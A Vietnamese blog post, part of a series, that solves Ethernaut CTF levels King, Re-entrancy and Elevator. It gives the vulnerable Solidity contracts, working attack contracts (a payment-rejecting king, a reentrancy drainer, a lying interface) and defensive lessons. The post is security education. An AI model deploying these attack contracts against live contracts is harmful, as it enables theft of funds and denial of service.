Chào các bạn, hôm nay chúng ta sẽ đến với phần 3 của chuỗi bài *Blockchain - hacking smart contract with Ethernaut CTF*, Ở phần này, chúng ta sẽ đối mặt với những thử thách khó nhằn hơn những phần trước.

Trước khi vào bài hãy pha cho mình một cốc cà phê & chuẩn bị chút đồ ăn nhẹ nhé.

Final round, fight!

**The Ethernaut**: https://ethernaut.zeppelin.solutions/

Một vài recommend:

- Sẽ tốt hơn nếu bạn có kiến thức về Blockchain và Smart Contract
- Sẽ tốt hơn nếu bạn có kiến thức về Solidity và Web3js
- Sẽ là tốt hơn nếu bạn biết cách sử dụng Remix IDE hoặc Truffle

## 9. King 　★★★★★★

**Nhiệm vụ**: Đây là một trò chơi, trong đó người nào muốn trở thành **king** (nhà vua) thì sẽ phải trả giá cho người đang nắm giữ vị trí ấy một khoản tiền cao hơn giá trị của nhà vua hiện tại. Nhiệm vụ của bạn là bằng cách nào đó, trở thành **king** và giữ vị trí này mãi mãi, dù người khác có trả mức giá nào đi nữa

```js
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

### Phân tích

- Để trở thành vua, ta phải gửi tiền cho nhà vua hiện tại. Theo đó, nếu như ta đang làm vua, và bằng cách nào đó, ta từ chối mọi giao dịch chuyển tiền đến ta, thì ta sẽ giữ vị trí đó mãi mãi. Vấn đề ở đây là ta làm sao có thể "từ chối mọi giao dịch" ? Đó là lúc ta cần biết đến `payable` trong solidity.
- Để một contract có thể nhận được tiền, trừ trường hợp được nhận tiền từ `selfdestruct` của một contract khác, thì cách duy nhất đó chính là có fallback function với `payable` modifier. Nếu không có `payable`, contract không thể nhận dù chỉ một đồng.
- Cùng nhìn lại hàm fallback function của King contract:

```js
function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}
```

- Ta nảy ra ý tưởng làm cho hàm `king.transfer(msg.value)` không thành công và transaction bị revert.
- Chuẩn bị một contract không có `payable` fallback, chiếm quyền và thế là xong.

### Solution

- Trên Chrome Console, kiểm tra king hiện tại:

```js
await contract.king()
```

- Kiểm tra price hiện tại:

```js
await contract.prize().then(x => x.toNumber);
> 1000000000000000000
```
nghĩa là giải thưởng hiện tại là 1 ether

- Trên Remix IDE, chuẩn bị một contract tấn công không có `payable fallback`

```js
contract Attack {

  function steal(address _target) public payable {
    if(!_target.call.value(msg.value)()) revert();
  }
}
```
- mình sẽ giải thích thêm một chút về đoạn `if(!_target.call.value(msg.value)()) revert();`, có vẻ trông đoạn này hơi lạ nhưng có lý do của nó:
    - để gửi eth đến một địa chỉ, chúng ta có 3 cách: `transfer`, `send`, `call.value`. Trong đó thì `transfer` và `send` được fixed số *gas limit* là **2100**, quá là thấp, có nghĩa `transfer` và `send` chỉ thuần tuý là để chuyển eth mà không thể thực hiện thêm bất cứ logic nào trong fallback function cả.
    - `call.value` là một hàm lowlevel, không giới hạn số *gas limit*, tuy nhiên sẽ trả về kết quả `true/false` thay vì throw ra một exception, vì thế ta cần đưa vào đoạn `if-revert` để biết được nó có lỗi hay không.
- Compile và chạy hàm steal, `_target` là king instance của bạn, `msg.value` ta cho một giá trị lớn hơn prize hiện tại, ví dụ 1.1 ether (1100 finneys).

- Kiểm tra lại king hiện tại và thấy đang là bạn:

```js
await contract.king()
```

- Sử dụng một tài khoản khác, gửi tiền vào King contract với một giá trị lớn hơn prize hiện tại để xem có chiếm được quyền King hay không. Nếu không chiếm được, bạn đã thành công.

- Submit && all done!

### Bình luận

- Bài này khá là tricky.
- Một lần nữa cho thấy tầm quan trọng cũng như sự nguy hiểm trong cách sử dụng fallback function. Tiền nong mà!
- Việc tấn công một contract tốt nhất luôn luôn là dùng một contract khác.

## 10. Re-entrancy　★★★★★★

**Nhiệm vụ**: Rút hết tiền khỏi smart contract

```js
pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}
```

### Phân tích

- Việc sử dụng các hàm low-level luôn tiềm ẩn nguy cơ xảy ra lỗi. Trong trường hợp này cũng không ngoại lệ, đó là hàm `call`.
- Để chuyển tiền, ta có 3 hàm: `transfer`, `send` và `call`. Giờ đây người ta khuyên chỉ nên dùng transfer và tránh hai hàm còn lại. Một cách hiểu đơn giản: `transfer` sẽ revert lại giao dịch một khi xảy ra lỗi. `send` chỉ trả vể false khi xảy ra lỗi chứ không revert, `call` cũng vậy; nhưng trong khi `send` chỉ được tiêu dè sẻn có 2300 gas thì `call` được phép dùng bao giờ hết gas thì thôi. Đây chính là điểm để ta khai thác.
- Khi rút tiền về địa chỉ của một contract thì `fallback function` của contract đó sẽ được kích hoạt. Sẽ ra sao nếu trong fallback function ta gọi rút tiền một lần nữa, chẳng phải sẽ là đệ quy rút cho tới lúc hết sạch tiền hay sao ?

### Solution

- Chuẩn bị contract tấn công, hãy thay địa chỉ `_target` bằng địa chỉ instance của bạn

```js
contract Attack {
    address target;
    Reentrance re;

    function Attack(address _target) {
        target = _target;
        re = Reentrance(target);
    }

    function attack() public payable {
        re.withdraw(0.5 ether);
    }

    function() payable {
        re.withdraw(0.5 ether);
    }
}
```

- Trên RemixIDE, load *Reentrancy* contract và complile cũng như run *Attack* contract

- Tiến hành chạy hàm `donate()` để donate cho *Attack* contract 1 ether

- Chạy hàm `attack()` của *Attack* contract

- Trên Chrome console, kiểm tra lại balance của *Reentrancy* instance xem đã về 0 chưa

```js
await getBalance(contract.address);
> 0
```

- Submit && all done!

### Bình luận

- Đây là một tấn công có thể nói là kinh điển nhất của nền tảng ethereum cho tới thời điểm hiện tại. Bạn có thể đọc thêm về [The DAO Hack](https://www.reddit.com/r/ethereum/comments/4oi2ta/i_think_thedao_is_getting_drained_right_now/)
- Hãy sử dụng `transfer` thay vì `call`
- Hãy luôn kiểm tra các điều kiện, fail càng sớm càng tốt
- Đọc thêm: https://blog.zeppelin.solutions/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942

## 11. Elevator　★★★★☆☆

**Nhiệm vụ**: Chiếc thang máy này ngăn cản bạn lên tầng trên cùng. Bằng cách nào đó hãy *break the rule* và leo lên đỉnh.

```js
pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### Phân tích

- Trong solidity có đoạn:
> **View Functions**
>
> Functions can be declared view in which case they promise not to modify the state.

- vậy ra `view` thực chất chỉ là một lời hứa "hão" rằng ta chỉ *nhìn* mà không *nắn bóp* dữ liệu. Trên thực tế, trong hàm `view` việc ta *nắn bóp* hay sửa đổi data cũng không có làm sao cả.

### Solution

- Trên RemixIDE, chuẩn bị contract để tấn công, implement `Elevator interface`, nhớ thay địa chỉ `_target` bằng địa chỉ instance của bạn:

```js
contract ElevatorAttack {
  bool public isLast = true;

  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _target) public {
    Elevator elevator = Elevator(_target);
    elevator.goTo(10);
  }
}
```

- Theo trên, cứ tầng chẵn thì hàm sẽ trả về đó là top floor.
- Chạy hàm `attack()`
- Trên Chrome Console, kiểm tra lại điều kiện `top`:

```js
await contract.top()
> true
```

- Submit && all done!

### Bình luận

- Lời hứa chỉ là lời hứa, đừng tin bố con thằng nào.

## Conclusion

Vậy là chúng ta đã hoàn thành chuỗi bài *Blockchain - hacking smart contract with Ethernaut CTF*.

Hi vọng những kiến thức trong đó có thể giúp ích được các bạn ít nhiều trong việc viết code solidity nói riêng cũng như các ứng dụng phi tập trung nói chung.

*Update 2018/08/01*: Ethernaut đã được thêm mấy bài mới, các bạn hãy đón đọc trong những bài viết kế tiếp của mình nhé. 

Enjoy coding!

## References

- [The Ethernaut](https://ethernaut.zeppelin.solutions/)
- [Remix](https://remix.ethereum.org/)
- [Solidity Docs](http://solidity.readthedocs.io/en/develop/types.html#members-of-addresses)
- [Recommendations for Smart Contract Security in Solidity](https://consensys.github.io/smart-contract-best-practices/recommendations/#be-aware-of-the-tradeoffs-between-send-transfer-and-callvalue)